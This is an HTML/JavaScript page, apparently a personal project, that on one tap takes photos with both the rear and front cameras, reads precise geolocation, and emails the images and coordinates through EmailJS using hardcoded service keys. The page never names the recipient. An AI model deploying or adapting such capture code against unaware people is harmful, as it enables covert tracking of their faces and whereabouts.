<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>カメラ＋位置＋EmailJS（許可一回のみ）</title>
<style>
  body { font-family: Arial, sans-serif; margin: 20px; background: #667eea; color: white; }
  .container { max-width: 600px; margin: auto; text-align: center; }
  .touch-area {
    border: 2px dashed rgba(255,255,255,0.5); border-radius: 12px;
    background: rgba(255,255,255,0.1); padding: 40px; margin: 20px 0; cursor: pointer;
  }
  .status { margin-top: 15px; padding: 10px; border-radius: 6px; background: rgba(0,0,0,0.4); }
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init("cPjKBUm_i6HebDQF7");
</script>
</head>
<body>
<div class="container">
  <h1>📷 カメラ＋位置情報＋EmailJS</h1>
  <div class="touch-area" id="touchArea">▶️ タップ/クリックで撮影＆送信</div>
  <div class="status" id="status">待機中...</div>

  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
  const touchArea = document.getElementById('touchArea');
  const status = document.getElementById('status');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  // グローバルにカメラストリームと位置情報を保持し再利用
  let mediaStream = null;
  let cachedLocation = null;
  let isProcessing = false;

  async function initCamera(facingMode) {
    if(mediaStream) return mediaStream;
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode },
        audio: false
      });
      video.srcObject = mediaStream;
      await new Promise(r => setTimeout(r, 1000)); // カメラ起動待ち
      return mediaStream;
    } catch(e) {
      throw new Error('カメラ許可エラーまたは未対応');
    }
  }

  async function capturePhoto(facingMode) {
    status.textContent = `📸 ${facingMode}カメラ撮影中...`;
    const stream = await initCamera(facingMode);
    const videoTrack = stream.getVideoTracks()[0];
    const settings = videoTrack.getSettings();

    canvas.width = settings.width || 640;
    canvas.height = settings.height || 480;
    const ctx = canvas.getContext('2d');

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    // 画質を落としてbase64に変換
    const dataUrl = canvas.toDataURL('image/jpeg', 0.2);
    return dataUrl;
  }

  async function getLocation() {
    if(cachedLocation) return cachedLocation;
    status.textContent = "📍 位置情報取得中...";
    cachedLocation = await new Promise((resolve, reject) => {
      if(!navigator.geolocation) return reject(new Error('位置情報未対応'));
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos.coords),
        err => reject(new Error('位置情報取得失敗')),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
    return cachedLocation;
  }

  async function sendEmail(params) {
    status.textContent = "✉️ メール送信中...";
    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', params);
      status.textContent = "✅ メール送信完了！";
    } catch (e) {
      status.textContent = "❌ メール送信失敗";
      throw e;
    }
  }

  async function process() {
    if(isProcessing) {
      status.textContent = "❌ 処理中です。少し待ってください。";
      return;
    }
    isProcessing = true;

    try {
      // 外カメ
      const photoRear = await capturePhoto('environment');
      // 内カメ
      const photoFront = await capturePhoto('user');

      // 位置情報
      let location = null;
      try {
        location = await getLocation();
      } catch {
        location = { latitude: "不明", longitude: "不明", accuracy: "不明" };
      }

      // EmailJSパラメータ作成
      const templateParams = {
        photo_rear: photoRear,
        photo_front: photoFront,
        location_info: `緯度: ${location.latitude || location.lat || '不明'}<br>経度: ${location.longitude || location.lon || '不明'}<br>精度: ${location.accuracy || location.acc || '不明'}m`,
        date: new Date().toLocaleString()
      };

      await sendEmail(templateParams);
    } catch (e) {
      console.error(e);
      status.textContent = `❌ エラー: ${e.message}`;
    } finally {
      isProcessing = false;
    }
  }

  touchArea.addEventListener('click', process);
  touchArea.addEventListener('touchstart', e => {
    e.preventDefault();
    process();
  }, { passive:false });
</script>
</body>
</html>
